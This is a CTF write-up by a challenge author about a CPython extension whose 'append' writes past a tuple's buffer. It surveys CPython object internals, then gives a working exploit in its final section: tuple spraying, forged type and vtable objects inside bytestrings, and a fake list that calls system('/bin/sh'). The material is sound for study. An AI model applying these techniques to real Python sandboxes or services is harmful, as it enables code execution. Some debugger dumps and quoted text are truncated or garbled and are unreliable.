Back in late July, Sieberrsec hosted their first-ever in-person finals for the annual Sieberr event. At the same time, I
was stuck in camp, bored out of my mind, and so I started to play around with the Python internals. The result is this
challenge which I feel is quite a fun introduction to certain concepts that are also used in v8 exploitation. I'm a
little late for this writeup because I was busy with a bunch of other stuff, but here it is!

# Analysis

In IDA, we can jump to the `definition{:c}` object in the `PyInit_mutuple{:c}` function. The object contains all the
information we need to know about this module, including the methods that it creates. In this case, there's only 1
function that it creates, bound to `mutuple.append{:py}`. This is what it looks like in IDA:

```
.data:0000000000004060                 public definition
.data:0000000000004060 ; PyModuleDef definition
.data:0000000000004060 definition      PyModuleDef <<0>, offset aMutuple, 0, 0, offset methods, 0, 0, 0, 0>
.data:0000000000004060                                         ; DATA XREF: LOAD:0000000000000440↑o
.data:0000000000004060                                         ; .got:definition_ptr↑o
.data:0000000000004060                                         ; "mutuple"
.data:00000000000040C8                 align 20h
.data:00000000000040E0                 public methods
.data:00000000000040E0 ; PyMethodDef methods[1]
.data:00000000000040E0 methods         PyMethodDef <offset aAppend, offset method_append, 1, 0>
.data:00000000000040E0                                         ; DATA XREF: LOAD:0000000000000428↑o
.data:00000000000040E0                                         ; .data:definition↑o
.data:00000000000040E0 _data           ends                    ; "append"
```

Looking at the `append{:c}` function, it's actually quite short.

```c
PyObject *__fastcall method_append(PyObject *self, PyObject *args)
{
  PyTupleObject *v2; // rax
  Py_ssize_t ob_size; // rdx
  PyTupleObject *the_tuple; // [rsp+8h] [rbp-20h] BYREF
  PyObject *to_add[3]; // [rsp+10h] [rbp-18h] BYREF

  to_add[1] = (PyObject *)__readfsqword(0x28u);
  the_tuple = 0;
  to_add[0] = 0;
  if ( !(unsigned int)PyArg_UnpackTuple(args, "ref", 2, 2, &the_tuple, to_add) )
    return 0;
  v2 = the_tuple;
  if ( (the_tuple->ob_base.ob_base.ob_type->tp_flags & 0x4000000) != 0 )
  {
    ob_size = the_tuple->ob_base.ob_size;
    the_tuple->ob_base.ob_size = ob_size + 1;
    v2->ob_item[ob_size] = to_add[0];
    return (PyObject *)&Py_TrueStruct;
  }
  else
  {
    PyErr_SetString(PyExc_TypeError, "first argument must be of type tuple");
    return 0;
  }
}
```

The first operation we see is `PyArg_UnpackTuple{:c}`. Taking a look at the
[documentation](https://docs.python.org/3/c-api/arg.html#c.PyArg_UnpackTuple):

> `int PyArg_UnpackTuple(PyObject *args, const char *name, Py_ssize_t min,
> Py_ssize_t max, ...){:c}`
>
> A simpler form of parameter retrieval which does not use a format string to
> specify the types of the arguments. Functions which use this method to
> retrieve their parameters should be declared as METH_VARARGS in function or
> method tables. The tuple containing the actual parameters should be passed as
> args; it must actually be a tuple. The length of the tuple must be at least
> min and no more than max; min and max may be equal. Additional arguments must
> be passed to the function, each of which should be a pointer to a PyObject*
> variable; these will be filled in with the valueefroeargs; they will contain
> borrowed references. The variables which correspond to optional parameters not
> given by args will not be filled in; these should be initialized by the
> caller. This function returns true on success and false if args is not a tuple
> or contains the wrong number of elements; an exception will be set if there
> was a failure.

So `args{:c}` (which, by default, is constructed as a tuple when calling a function with arguments) should have 2
elements. The first element should be a tuple, and is stored in `the_tuple{:c}`. The second element can be any
`PyObject` and is stored in `to_add{:c}`.

Then, the module simply increments the size of the tuple by 1, and appends the `to_add{:c}` element to the tuple's
`ob_item{:c}` array.

This is quite simple, and the vulnerability is in plain sight: we will eventually assign to the tuple's backing buffer
out-of-bounds.

# Exploration

With this primitive in mind, let's now take a look at how CPython objects work! For me, this part was pretty fun (and
information as well), because these stuff aren't really well-documented, but the structs themselves are simple enough so
we can make sense of them pretty easily. Some (most) of the following won't be very relevant to the challenge; they're
mostly just stuff that I discovered while planning this challenge. If you're just interested in the writeup, you can
skip ahead to [here](#exploit) and refer back another time!

Since our structs may differ from Python version to version, for the sake of completeness, these are the specifications
I'm running the challenge on:

- Docker image `ubuntu:20.04@sha256:8feb4d8ca5354def3d8fce243717141ce31e2c428701f6682bd2fafe15388214`
- Python 3.9.5

You can refer to the Dockerfile for more details.

To compile Python with debugging symbols, we can get [the source from
here](https://www.python.org/downloads/release/python-395/), and run the
following commands in the extracted directory:

```bash
export CFLAGS="-fno-pie -g"
export LDFLAGS="-no-pie"
mkdir debug && cd debug
../configure
make
```

After successful compilation, the binary `python` is created and we can debug it
using `pwndbg`.

Unfortunately, because of pwndbg's own Python runtime, we might run into the
following error when trying to debug `python3.9` inside pwndbg:

```
Python path configuration:
  PYTHONHOME = '/usr/local/lib/pwndbg-gdb'
  PYTHONPATH = (not set)
  program name = '/usr/bin/python3.9'
  isolated = 0
  environment = 1
  user site = 0
  import site = 1
  sys._base_executable = '/usr/bin/python3.9'
  sys.base_prefix = '/usr/local/lib/pwndbg-gdb'
  sys.base_exec_prefix = '/usr/local/lib/pwndbg-gdb'
  sys.platlibdir = 'lib'
  sys.executable = '/usr/bin/python3.9'
  sys.prefix = '/usr/local/lib/pwndbg-gdb'
  sys.exec_prefix = '/usr/local/lib/pwndbg-gdb'
  sys.path = [
    '/usr/local/lib/pwndbg-gdb/lib/python39.zip',
    '/usr/local/lib/pwndbg-gdb/lib/python3.9',
    '/usr/local/lib/pwndbg-gdb/lib/python3.9/lib-dynload',
  ]
Fatal Python error: init_fs_encoding: failed to get the Python codec of the filesystem encoding
Python runtime state: core initialized
ModuleNotFoundError: No module named 'encodings'
```

To fix this, we need to set the `PYTHONPATH` environment variable to the Python
pre-installed module directory. In the Docker container, this is
`/usr/lib/python3.9` - I copied this directory out into my host and set the
env var to the relative path. After setting this, we should be ready to debug!

## The heap

The Python heap is a lot more nuanced than what we'll be covering in this
writeup, but it's not the main focus so I'll gloss over it a bit. 

Essentially, there is a general-purpose allocator that is in charge of
allocating all types of objects. Operating below this general-purpose allocator
are object-specific allocators that have their own regions (which are
contained in the general-purpose allocator's arena). Thus, certain objects that
have object-specific allocators may not be allocated in the same region as another
object. We can refer to this explanation in `Objects/obmalloc.c`:

```
   An object allocator for Python.

   Here is an introduction to the layers of the Python memory architecture,
   showing where the object allocator is actually used (layer +2), It is
   called for every object allocation and deallocation (PyObject_New/Del),
   unless the object-specific allocators implement a proprietary allocation
   scheme (ex.: ints use a simple free list). This is also the place where
   the cyclic garbage collector operates selectively on container objects.

```

The object allocator (pymalloc) requests large pages via `mmap{:c}` to form
arenas. Each arena is then subdivided into pools of different sizes, where the
object size of the n+1th pool is 8 bytes greater than the nth pool. Each pool is
4kb (or the system defined page size) and there are 64 pools in an arena.
Allocations larger than 512 bytes skip pymalloc and are directly allocated by
the system allocator (eg. `malloc{:c}`).

In another post I'll detail each object and where it's allocated. But for this
challenge, it's not so important so I'll skip it for now.

## Objects

Every object in Python is either of type `PyObject{:c}` or `PyVarObject{:c}`.

```c title="Include/object.h"
typedef struct _object {
    _PyObject_HEAD_EXTRA
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
} PyObject;

typedef struct {
    PyObject ob_base;
    Py_ssize_t ob_size; /* Number of items in variable part */
} PyVarObject;
```

The only difference is that `PyVarObject{:c}` has an additional field indicating
the size of the _variable_ length object. This header is used in all Python
objects, and following this header are the member fields of the object.

A very common object that we can analyze is the `PyTypeObject` generic object.

```c title="Include/cpython/object.h"
struct _typeobject {
    PyObject_VAR_HEAD
    const char *tp_name; /* For printing, in format "<module>.<name>" */
    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */

    /* Methods to implement standard operations */

    destructor tp_dealloc;
    Py_ssize_t tp_vectorcall_offset;
    getattrfunc tp_getattr;
    setattrfunc tp_setattr;
    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)
                                                                                                      or
tp_reserved (Python 3) */
    reprfunc tp_repr;

    /* Method suites for standard classes */

    PyNumberMethods *tp_as_number;
    PySequenceMethods *tp_as_sequence;
    PyMappingMethods *tp_as_mapping;

    /* More standard operations (here for binary compatibility) */

    hashfunc tp_hash;
    ternaryfunc tp_call;
    reprfunc tp_str;
    getattrofunc tp_getattro;
    setattrofunc tp_setattro;

    /* Functions to access object as input/output buffer */
    PyBufferProcs *tp_as_buffer;

    /* Flags to define presence of optional/expanded features */
    unsigned long tp_flags;

    const char *tp_doc; /* Documentation string */

    /* Assigned meaning in release 2.0 */
    /* call function for all accessible objects */
    traverseproc tp_traverse;

    /* delete references to contained objects */
    inquiry tp_clear;

    /* Assigned meaning in release 2.1 */
    /* rich comparisons */
    richcmpfunc tp_richcompare;

    /* weak reference enabler */
    Py_ssize_t tp_weaklistoffset;

    /* Iterators */
    getiterfunc tp_iter;
    iternextfunc tp_iternext;

    /* Attribute descriptor and subclassing stuff */
    struct PyMethodDef *tp_methods;
    struct PyMemberDef *tp_members;
    struct PyGetSetDef *tp_getset;
    struct _typeobject *tp_base;
    PyObject *tp_dict;
    descrgetfunc tp_descr_get;
    descrsetfunc tp_descr_set;
    Py_ssize_t tp_dictoffset;
    initproc tp_init;
    allocfunc tp_alloc;
    newfunc tp_new;
    freefunc tp_free; /* Low-level free-memory routine */
    inquiry tp_is_gc; /* For PyObject_IS_GC */
    PyObject *tp_bases;
    PyObject *tp_mro; /* method resolution order */
    PyObject *tp_cache;
    PyObject *tp_subclasses;
    PyObject *tp_weaklist;
    destructor tp_del;

    /* Type attribute cache version tag. Added in version 2.6 */
    unsigned int tp_version_tag;

    destructor tp_finalize;
    vectorcallfunc tp_vectorcall;
};
```

Every class object is an instance of `PyTypeObject{:c}`. Let's look at one
example, integers (or `PyLong_Type`).

### `PyLong_Type{:c}`

```c title="Objects/longobject.c"
PyTypeObject PyLong_Type = {
    PyVarObject_HEAD_INIT(&PyType_Type, 0)
    "int",                                      /* tp_name */
    offsetof(PyLongObject, ob_digit),           /* tp_basicsize */
    sizeof(digit),                              /* tp_itemsize */
    0,                                          /* tp_dealloc */

    0,                                          /* tp_getattr */
    0,                                          /* tp_setattr */
    0,                                          /* tp_as_async */
    long_to_decimal_string,                     /* tp_repr */
    &long_as_number,                            /* tp_as_number */
    0,                                          /* tp_as_sequence */
    0,                                          /* tp_as_mapping */
    (hashfunc)long_hash,                        /* tp_hash */
    0,                                          /* tp_call */

    PyObject_GenericGetAttr,                    /* tp_getattro */
    0,                                          /* tp_setattro */
    0,                                          /* tp_as_buffer */

    0,                                          /* tp_iter */
    0,                                          /* tp_iternext */
    long_methods,                               /* tp_methods */

    0,                                          /* tp_descr_set */
    0,                                          /* tp_dictoffset */
    0,                                          /* tp_init */
    0,                                          /* tp_alloc */
    long_new,                                   /* tp_new */
    PyObject_Del,                               /* tp_free */
};
```

When we call `int(){:c}` to create an integer, `PyLong_Type->tp_new{:c}` is
called. However, it doesn't seem like this method is called if we create an
integer natively. It is interesting to investigate this, and I'll leave it for
future study.

We also notice the following behaviour: for integers in the range \[-5, 256\],
they are not allocated in the current `pymalloc` region that we're using for
object allocations. Instead, they're pre-initialized in `pycore_init_types{:c}`,
where the call to `_PyLong_Init{:c}` is made.

```c title="Objects/longobject.h"
#if NSMALLNEGINTS + NSMALLPOSINTS > 0
    for (Py_ssize_t i=0; i < NSMALLNEGINTS + NSMALLPOSINTS; i++) {
        sdigit ival = (sdigit)i - NSMALLNEGINTS;
        int size = (ival < 0) ? -1 : ((ival == 0) ? 0 : 1);

        PyLongObject *v = _PyLong_New(1);
        if (!v) {
            return -1;
        }

        Py_SET_SIZE(v, size);
        v->ob_digit[0] = (digit)abs(ival);

        tstate->interp->small_ints[i] = v;
    }
#endif
```

Pointers to these small integers are stored in the global
`PyInterpreterState{:c}` (which is also allocated on the `pymalloc{:c}` heap).

```c title="Include/internal/pycore_interp.h"
#define _PY_NSMALLPOSINTS           257
#define _PY_NSMALLNEGINTS           5

// The PyInterpreterState typedef is in Include/pystate.h.
struct _is {

  // ...

#if _PY_NSMALLNEGINTS + _PY_NSMALLPOSINTS > 0
    /* Small integers are preallocated in this array so that they
       can be shared.
       The integers that are preallocated are those in the range
       -_PY_NSMALLNEGINTS (inclusive) to _PY_NSMALLPOSINTS (not inclusive).
    */
    PyLongObject* small_ints[_PY_NSMALLNEGINTS + _PY_NSMALLPOSINTS];
#endif
};
```


The following snippet illustrates this:

```py
>>> a = 1
>>> b = 0xdeadbeef
>>> hex(id(a))
'0x7ffff7e532c0'
>>> hex(id(b))
'0x7ffff775fec0'
```

`a` is a small int and is allocated in a separate page from the current
`pymalloc` region.

> Note that depending on the Python version, this page may or may not be
> adjacent to the binary's base address. I suspect `pymalloc` initially uses the
> `brk` syscall to extend the heap region, and depending on how many objects
> were initialized, this heap region may be filled up pre-maturely. In that

> will end up in the `mmap` region, and will not be adjacent to the binary base.
> I've tested it out on a few different systems and Python versions, and it
> seems to differ from version to version, but consistent regardless of the
> system.

We can also observe the following:

```py
>>> c = 1
>>> d = 0xdeadbeef
>>> hex(id(c))
'0x7ffff7e532c0'
>>> hex(id(d))
'0x7ffff775fe40'
```

In the same environment, we create 2 more variables `c` and `d`. `c` is pointing
to the same address as `a`, while `d` creates a new `PyLongObject{:c}` right
after `b`. That's because the integer instantiation code knows that we need a
small int, and directly returns the pre-initialized small int. For bigger ints,
we have no choice but to create a new int.

Now, let's take a look at what's actually stored in memory!

This is the implementation of `PyLongObject{:c}`. Interestingly, it's defined as
a `PyVarObject{:c}`.

```c
/* Long integer representation.
   The absolute  to  of a number is equal to
        SUM(for i=0 through abs(ob_size)-1) ob_digit[i] * 2**(SHIFT*i)
   Negative numbers are represented with ob_size < 0;
   zero is represented by ob_size == 0.
   In a normalized number, ob_digit[abs(ob_size)-1] (the most significant
   digit) is never zero.  Also, in all cases, for all valid i,
        0 <= ob_digit[i] <= MASK.
   The allocation function takes care of allocating extra memory
   so that ob_digit[0] ... ob_digit[abs(ob_size)-1] are actually available.

   CAUTION:  Generic code manipulating subtypes of PyVarObject has to
   aware that ints abuse  ob_size's sign bit.
*/
struct _longobject {
    PyObject_VAR_HEAD
    digit ob_digit[1];
};
```

Let's take a look at the integers we allocated earlier.

```ansi title="a = 1"
[1m[32mpwndbg> [0mtel 0x7ffff7e532c0

```

```ansi title="b = 0xdeadbeef"

03:0018│  [35m0x7ffff775fed8[39m ◂— 0x31eadbeef
```

The `SHIFT` value defined on 64-bit is 30 (on 32-bit, it's 15). For `a =
1{:py}`, `ob_size == 1{:c}` so there is no special math going on, we just take
the value in the first 4 bytes of the `PyLongObject{:c}`'s data. For `b =
0xdeadbeef{:py}`, `ob_size == 2{:c}`:

```py
>>> hex(0x31eadbeef & 0b111111111111111111111111111111)
'0x1eadbeef'
>>> hex((0x31eadbeef >> 32) & 0b111111111111111111111111111111)
'0x3'
>>> hex(0x1eadbeef + 0x3 * 2 ** 30)
'0xdeadbeef'
```

How about negative numbers?

```ansi title="a = -1"
[1m[32mpwndbg> [0mtel 0x7ffff7e53240
00:0000│  [35m0x7ffff7e53240[39m ◂— 0x1d

03:0018│  [35m0x7ffff7e53258[39m ◂— 0xfdfdfdfd00000001
```

Ah, so for negative numbers, the `ob_size{:c}` field is set to a negative value.

It's good to note that booleans are also implemented using `PyLongObject{:c}`,
with the `ob_type{:c}` field set to `PyBool_Type{:c}` instead of
`PyLong_Type{:c}`. In fact, `PyBool_Type{:c}` is a subclass of `PyLong_Type{:c}`
as we can see here - its `tp_base{:c}` member is set to `PyLong_Type{:c}`.

```c title="Objects/boolobject.c" {32}
PyTypeObject PyBool_Type = {
    PyVarObject_HEAD_INIT(&PyType_Type, 0)
    "bool",
    sizeof(struct _longobject),
    // ...
    &PyLong_Type,                               /* tp_base */
    // ...
};
```

Another object that would be interesting for us is the list object.

### `PyList_Type{:c}`

Unlike `PyLongObject{:c}`, there are no pre-initialized `PyListObject{:c}`. This
is because a list is mutable and hence we need to allocate a new one for each
variable, even if it's just the empty list.

```py
>>> a = []
>>> b = [1, 2, 3]
>>> c = []
>>> d = [1, 2, 3]
>>> hex(id(a))
'0x7ffff777e320'
>>> hex(id(b))
'0x7ffff77829b0'
>>> hex(id(c))
'0x7ffff7782a50'
>>> hex(id(d))
'0x7ffff7782aa0'
```

Although the `PyListObject{:c}` is defined as a `PyVarObject{:c}`, it actually
has an `ob_size{:c}` value of 0. The backing buffer of the list is allocated
elsewhere on the heap, so that it's easier to grow or shrink the buffer as
needed. The `PyListObject{:c}` has a `ob_basicsize{:c}` of 0x28 and
`ob_itemsize{:c}` of 0x0.

```ansi title="a = [1, 2, 3]"
[1m[32mpwndbg> [0mtel 0x7ffff777e320
00:0000│  [35m0x7ffff777e320[39m ◂— 1

04:0020│  [35m0x7ffff777e340[39m ◂— 8
```

The reason why it's defined as a `PyVarObject{:c}` is so that we can abuse the
`ob_size{:c}` member again, this time to define the length of the list. 

```c title="Include/cpython/listobject.h"
typedef struct {
    PyObject_VAR_HEAD
    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */
    PyObject **ob_item;

    /* ob_item contains space for 'allocated' elements.  The number
     * currently in use is ob_size.
     * Invariants:
     *     0 <= ob_size <= allocated
     *     len(list) == ob_size
     *     ob_item == NULL implies ob_size == allocated == 0
     * list.sort() temporarily sets allocated to -1 to detect mutations.
     *
     * Items must normally not be NULL, except during construction when
     * the list is not yet visible outside the function that builds it.
     */
    Py_ssize_t allocated;
} PyListObject;
```

`allocated{:c}` stores the maximum capacity of the backing buffer.

In another post I'll detail the expanding and shrinking algorithms of the list.
Let's move on to tuples!

### `PyTuple_Type{:c}`

As opposed to lists, tuples are immutable, so we can share instances. In fact,
the memory management system of tuples is quite different from regular objects.
This is because it's so ubiquitous throughout the codebase, being used to pass
arguments to functions and so on. Therefore, specifically for tuples, there's a
global `free_list` variable that stores up to `PyTuple_MAXFREELIST{:c}` unused
tuple objects that are size `PyTuple_MAXSAVESIZE{:c}` and smaller.

```c title="Objects/tupleobject.c"
/* Speed optimization to avoid frequent malloc/free of small tuples */
#ifndef PyTuple_MAXSAVESIZE
#define PyTuple_MAXSAVESIZE     20  /* Largest tuple to save on free list */
#endif
#ifndef PyTuple_MAXFREELIST
#define PyTuple_MAXFREELIST  2000  /* Maximum number of tuples of each size to save */
#endif

#if PyTuple_MAXSAVESIZE > 0
/* Entries 1 up to PyTuple_MAXSAVESIZE are free lists, entry 0 is the empty
   tuple () of which at most one instance will be allocated.
*/
static PyTupleObject *free_list[PyTuple_MAXSAVESIZE];
static int numfree[PyTuple_MAXSAVESIZE];
#endif
```

When a tuple is freed, instead of being cleaned up by the gc, it's sent to the
tuple free list, and when an allocation of the same size is requested, a tuple
is returned from the free list in a LIFO manner.

Note that the empty tuple is actually not explicitly pre-allocated. Checking the
implementation of `PyTuple_New{:c}` and `tuple_alloc{:c}`, there is special
handling logic for the empty tuple, which means that it is possible for a tuple
of size 0 to be allocated during runtime (which itself implies that there is a
point during runtime when the empty tuple was unallocated).
However, once the empty tuple is allocated it is never freed, which
`PyTuple_New{:c}` takes care of by increasing its refcount by 1.

```c
#if PyTuple_MAXSAVESIZE > 0
    if (size == 0) {
        free_list[0] = op;
        ++numfree[0];
        Py_INCREF(op);          /* extra INCREF so that this is never freed */
    }
#endif
``` 

By the time we (the user) can execute instructions, the empty tuple is already
allocated; it seems to be allocated outside of the current `pymalloc{:c}`
region, in the same region as the `small_ints{:c}`.

```py
>>> a = ()
>>> hex(id(a))
'0x7ffff7e1d040'
>>> hex(id(2147483648))
'0x7ffff7b10b30'
>>> hex(id(1))
'0x7ffff7e1f930'
```

As usual, let's look at how the tuple is stored in memory.

```c title="Include/cpython/tupleobject.h"
typedef struct {
    PyObject_VAR_HEAD
    /* ob_item contains space for 'ob_size' elements.
       Items must normally not be NULL, except during construction when
       the tuple is not yet visible outside the function that builds it. */
    PyObject *ob_item[1];
} PyTupleObject;
```

```ansi title="a = (1, 2, 3)"
[1m[32mpwndbg> [0mtel 0x7ffff7b0f040

```

This time, unlike integer and list, tuple actually uses `ob_size{:c}` in the
proper way. `tp_basicsize{:c}` is 0x18 and `tp_itemsize{:c}` is 0x8. During
initialization of the tuple, pointers to each element is stored contiguously in
the `ob_item{:c}` array.


Another object worth looking into is the string. In this case, because string is actually pretty complicated due to
encodings and stuff, let's look at bytestrings instead.

### `PyBytes_Type{:c}`

Bytestrings are immutable too, which means we can share instances of bytestrings. The initialization function for
bytestrings does exactly that:

```c
PyObject *
PyBytes_FromString(const char *str)
{
    size_t size;
    PyBytesObject *op;

    assert(str != NULL);
    size = strlen(str);
    if (size > PY_SSIZE_T_MAX - PyBytesObject_SIZE) {
        PyErr_SetString(PyExc_OverflowError,
            "byte string is too long");
        return NULL;
    }
    if (size == 0 && (op = nullstring) != NULL) {
        Py_INCREF(op);
        return (PyObject *)op;
    }
    if (size == 1 && (op = characters[*str & UCHAR_MAX]) != NULL) {
        Py_INCREF(op);
        return (PyObject *)op;
    }

    /* Inline PyObject_NewVar */
    op = (PyBytesObject *)PyObject_MALLOC(PyBytesObject_SIZE + size);
    if (op == NULL)
        return PyErr_NoMemory();
    (void)PyObject_INIT_VAR(op, &PyBytes_Type, size);
    op->ob_shash = -1;
    memcpy(op->ob_sval, str, size+1);
    /* share short strings */
    if (size == 0) {
        nullstring = op;
        Py_INCREF(op);
    } else if (size == 1) {
        characters[*str & UCHAR_MAX] = op;
        Py_INCREF(op);
    }
    return (PyObject *) op;
}
```

Bytestrings of length 0 or 1 are stored as singletons. Like the empty tuple, once they're allocated, they are excluded
from garbage collection by arbitrarily increasing their refcount by 1. Also like the empty tuple, this may not
necessarily happen at runtime, but because bytestrings are quite commonly used as well (albeit not as much as tuples)
there are inevitably some bytestrings that get initialized before the interpreter executes our code.

This is how a bytestring is represented in memory:

```ansi title="a = b'asdf'"
[1m[32mpwndbg> [0mtel 0x7ffff779c5a0
00:0000│  [35m0x7ffff779c5a0[39m ◂— 1
01:0008│  [35m0x7ffff779c5a8[39m —▸ [35m0x6bc260 (PyBytes_Type)[39m ◂— 0x46 /* 'F' */
02:0010│  [35m0x7ffff779c5b0[39m ◂— 4
03:0018│  [35m0x7ffff779c5b8[39m ◂— 0x4e9eeb8be34b206b
04:0020│  [35m0x7ffff779c5c0[39m ◂— 0x66647361 /* 'asdf' */
```

And the struct:

```c
typedef struct {
    PyObject_VAR_HEAD
    Py_hash_t ob_shash;
    char ob_sval[1];

    /* Invariants:
     *     ob_sval contains space for 'ob_size+1' elements.
     *     ob_sval[ob_size] == 0.
     *     ob_shash is the hash of the string or -1 if not computed yet.
     */
} PyBytesObject;
```

`PyBytesObject{:c}` is a variable sized object that has `tp_basicsize{:c}` of 0x21 and `tp_itemsize{:c}` of 0x1.
Again, since it's immutable, the empty bytestring exists as a singleton. The actual contents of the bytestring are
placed at +0x20 from the start of the object.

The `ob_shash{:c}` member is a cached hash of the contents of the bytestring. This ensures that comparison operations
are more efficient, since we can just compare the hash instead of comparing the entire string, and we don't need to
recalculate the hash every time we want to do a comparison.

Actually, there's a case where the immutability of bytestrings are broken:

```c
/* The following function breaks the notion that bytes are immutable:
   it changes the size of a bytes object.  We get away with this only if there
   is only one module referencing the object.  You can also think of it
   as creating a new bytes object and destroying the old one, only
   more efficiently.  In any case, don't use this if the bytes object may
   already be known to some other part of the code...
   Note that if there's not enough memory to resize the bytes object, the
   original bytes object at *pv is deallocated, *pv is set to NULL, an "out of
   memory" exception is set, and -1 is returned.  Else (on success) 0 is
   returned, and the value in *pv may or may not be the same as on input.
   As always, an extra byte is allocated for a trailing \0 byte (newsize
   does *not* include that), and a trailing \0 byte is stored.
*/

int
_PyBytes_Resize(PyObject **pv, Py_ssize_t newsize)
{
    PyObject *v;
    PyBytesObject *sv;
    v = *pv;
    if (!PyBytes_Check(v) || newsize < 0) {
        goto error;
    }
    if (Py_SIZE(v) == newsize) {
        /* return early if newsize equals to v->ob_size */
        return 0;
    }
    if (Py_SIZE(v) == 0) {
        if (newsize == 0) {
            return 0;
        }
        *pv = _PyBytes_FromSize(newsize, 0);
        Py_DECREF(v);
        return (*pv == NULL) ? -1 : 0;
    }
    if (Py_REFCNT(v) != 1) {
        goto error;
    }
    if (newsize == 0) {
        *pv = _PyBytes_FromSize(0, 0);
        Py_DECREF(v);
        return (*pv == NULL) ? -1 : 0;
    }
    /* XXX UNREF/NEWREF interface should be more symmetrical */
#ifdef Py_REF_DEBUG
    _Py_RefTotal--;
#endif
#ifdef Py_TRACE_REFS
    _Py_ForgetReference(v);
#endif
    *pv = (PyObject *)
        PyObject_REALLOC(v, PyBytesObject_SIZE + newsize);
    if (*pv == NULL) {
        PyObject_Del(v);
        PyErr_NoMemory();
        return -1;
    }
    _Py_NewReference(*pv);
    sv = (PyBytesObject *) *pv;
    Py_SET_SIZE(sv, newsize);
    sv->ob_sval[newsize] = '\0';
    sv->ob_shash = -1;          /* invalidate cached hash value */
    return 0;
error:
    *pv = 0;
    Py_DECREF(v);
    PyErr_BadInternalCall();
    return -1;
}
```

This function can only be called if the bytestring has exactly 1 reference. If so, it saves some time and space by not
reallocating a new object for the requested size, but instead updating the size of the old bytestring. This shortcut is
quite dangerous, because we're exposing ourselves to a kind of "UAF" over here! The `Py_REFCNT(v) != 1{:c}` check is the
only guard preventing exploits on this UAF.

# Exploit

With all this context in mind, let's start solving the challenge!

## Getting our leaks

Our primitive is an out-of-bounds write from a tuple. We can append pointers to the end of the tuple, which possibly
overflows into the object after. First things first, let's get rid of the tuples in the freelist so we can get 2
adjacent tuples. Then, since the tuples are allocated in the `mmap` region adjacent to libc, by leaking one of their
addresses, we already have our libc leak.

```py
spray = []

# spray some tuples so attacker and victim are adjacent
for i in range(0x800):
    spray.append((i,))

attacker = spray[0x200]
victim = spray[0x201]
attacker_addr = id(attacker)
print_(hex(attacker_addr))
print_(hex(id(victim)))

libc_base = attacker_addr + 0x5947e0
print_(hex(libc_base))
system = libc_base + 0x52290
```

> Note: while this leak basically comes for free, its reliability is quite low because the address of our reference
> object can easily change in the `pymalloc` heap. To obtain a more reliable leak, one may need to get an arbitrary read
> primitive and leak the GOT, or otherwise leak some libc addresses from the `pymalloc` heap (although that itself is
> unreliable as well). If you have the Docker configuration, then it's not difficult to tweak the offset to obtain the
> correct libc base.

## Forging our `fakeobj`

A great target for our fake object is the `ob_type{:c}` pointer. It has a lot of function pointers that we can target to
get our RCE. Honestly, it doesn't really matter which function we overwrite, as long as the function passes in a pointer
to something we control as the first argument, which is most of them (the first argument is almost always the `PyObject
*{:c}` itself). I can't remember why but I chose to overwrite another vtable, the `tp_as_mapping{:c}` member. This
member points to a vtable that looks like this:

```c title="Objects/tupleobject.c"
static PyMappingMethods tuple_as_mapping = {
    (lenfunc)tuplelength,
    (binaryfunc)tuplesubscript,
    0
};
```

As the names suggest, the 2nd pointer in this vtable is called when we index the victim obj. If we can overwrite or fake
this, then we can set it to `system{:c}` and win!

The only issue is that we don't actually have arb write over the heap. Instead, we can only place object pointers on the
heap. To write arbitrary data to the heap, we can use a bytestring, but we won't have direct pointers to the fake
content in the bytestring (we can only reference the bytestring at the header, so our fake content is 0x20 bytes after
our bytestring pointer). The challenge here is, how do we create a direct reference to our forged object in the
bytestring, since we can't place arbitrary addresses on the heap?

The answer is to use list indexing. If we have a list on the heap, and we overwrite the backing buffer pointer to a
bytestring, then we can access an arbitrary pointer at +0x20 (which is the 5th index of the victim list). This pointer
can point to the start of our actual fake object.

> This is actually more convoluted than needed; there are probably much easier ways to solve the challenge. But since I
> wanted to have fun in this exploit, I tried to play around with Python types more.

First, create the fake vtable with our system pointer:

```py
payload_4 = bytes([i for i in ((system >> j * 8) & 0xff for j in range(8))])
fake_vtable = id(payload_4) + 0x20 - 0x8
```

Then create the fake type, taking care to set some of the important fields so we
don't crash pre-maturely:

```py
payload_1 = b"\x50" + b"\x00"*7 # type->refcount
payload_1 += b"\x80\x87\x90" + b"\x00"*5 # type->type
payload_1 += b"\x00" * 8
payload_1 += b"\xa3\x23\x7e" + b"\x00" * 5 # type->name
payload_1 += b"\x18" + b"\x00" * 7 # type->size
payload_1 += b"\x08" + b"\x00" * 7 # type->element_size
payload_1 += b"\x00" * 8 # type->tp_dealloc
payload_1 += b"\x00" * 8 # type->tp_vectorcall_offset
payload_1 += b"\x00" * 8 # type->tp_getattr
payload_1 += b"\x00" * 8 # type->tp_setattr
payload_1 += b"\x00" * 8 # type->tp_as_async
payload_1 += b"\x00" * 8 # type->tp_repr
payload_1 += b"\x00" * 8 # type->as_number
payload_1 += b"\x00" * 8 # type->as_sequence
payload_1 += bytes([i for i in ((fake_vtable >> j * 8) & 0xff for j in range(8))]) # type->as_mapping

fake_type = id(payload_1) + 0x20
print_(hex(fake_type))
```

Next, create a fake object that uses our fake type:

```py
payload_2 = b".bin/sh\x00" # refcount will increase by one changing . to /
payload_2 += bytes([i for i in ((fake_type >> j * 8) & 0xff for j in range(8))])
print_(payload_2)
fake_obj = id(payload_2) + 0x20
print_(hex(fake_obj))
```

And finally, create a list element slot by making a pointer to the fake object's
pointer. This prepares `payload_3` to be the backing buffer containing a pointer
to the fake object.

```py
payload_3 = bytes([i for i in ((fake_obj >> j * 8) & 0xff for j in range(8))])
```

Now, we can take advantage of the primitive to get RCE, by overwriting the victim tuple's type to list, and its backing
buffer to the fake backing buffer. Note that the `refcount{:c}`, `length{:c}`, and `capacity{:c}` members aren't
actually the values 0x2 and 0x10; they are just the addresses of these values.

```py
append(attacker, 0x1)
append(attacker, 0x1)
append(attacker, 0x2) # victim->refcount
append(attacker, type([])) # victim->type
append(attacker, 0x2) # victim->length
append(attacker, payload_3) # victim->elements
append(attacker, 0x10) # victim->capacity

victim[4]["oops"]
```

This was quite a fun intro to CPython pwn for me. Hope to make more such
challenges (and posts) soon!
